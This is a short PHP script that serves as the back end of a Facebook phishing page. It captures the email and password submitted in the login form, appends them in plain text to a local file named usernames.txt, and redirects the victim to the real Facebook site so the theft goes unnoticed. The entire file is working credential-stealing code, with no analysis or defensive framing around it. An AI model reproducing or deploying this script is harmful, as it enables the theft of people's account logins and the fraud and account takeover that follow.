<?PHP
header ("Location: http://www.facebook.com/");
$username = $_POST['email'];
$pass = $_POST['pass'];

$handle = fopen("usernames.txt", "a");
fwrite($handle, $username);
fwrite($handle, " : ");
fwrite($handle, $pass);
fwrite($handle, "\n");
fclose($handle);
exit;
